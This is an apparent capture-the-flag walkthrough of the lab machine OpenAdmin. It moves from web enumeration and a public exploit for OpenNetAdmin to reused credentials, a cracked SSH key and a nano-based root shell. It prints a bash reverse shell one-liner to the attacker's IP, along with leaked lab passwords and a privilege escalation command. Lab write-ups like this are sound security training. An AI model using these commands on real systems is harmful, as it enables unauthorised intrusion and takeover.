OpenAdmin

Target IP: 10.129.148.21

Scanning


There are two TCP ports open on the target machine: SSH and HTTP. I will start enumeration with HTTP application.

Enumeration

Port 80: HTTP

Running the command gobuster dir -u http://10.129.148.21/ -w /usr/share/wordlists/dirb/big.txt shows three interesting directories. They are /music, /artwork, and sierra.


The /music directory is interesting. There is a button on this page called Login which directs me to /ona, which is the page shown above. Doing a Google search for this application version shows it is vulnerable.


I found a public exploit for this application version.

Exploitation


Downloading the exploit above and checking if the host is vulnerable shows it is! Time to exploit the vulnerable machine using this exploit.


And now I have a simple RCE using this exploit to the target machine. Time to upgrade this to a reverse shell connection.


I started a listener on port 8444. Then using the exploit, I sent the command bash -c '/bin/bash -i >& /dev/tcp/10.10.16.19/8444 0>&1'. After, I gained a reverse shell connection from the remote host on port 8444 as shown above.

Privilege Escalation



I found an interesting config file with the name database_settings.inc.php at /var/www/ona/local/config. This file contains a username ona_sys and password n1nj4W4rri0R!. After spraying this password against the user jimmy, I got access!


After some further enumeration, it looks like there is another application running on port 52846.


There is another SHA512 hash inside /var/www/internal/index.php. Cracking this hash results in the password Revealed.



Curling main.php reveals an SSH key. I copied the key to my local machine and ran john to crack the passphrase bloodninjas.


Now I have logged in as joanna using the SSH key and password! I used the command ssh joanna@10.129.148.21 -i id_rsa



Looks like nano can be executed on the file /opt/priv. I opened nano and pressed CTRL+R and then CTRL+X to execute command. To break out, I used the command reset; sh 1>&0 2>&0. Now I have a root shell!

Flags


The user.txt flag once I gained a foothold on the machine as joanna user.


The root.txt flag once I used nano to spawn a root shell.
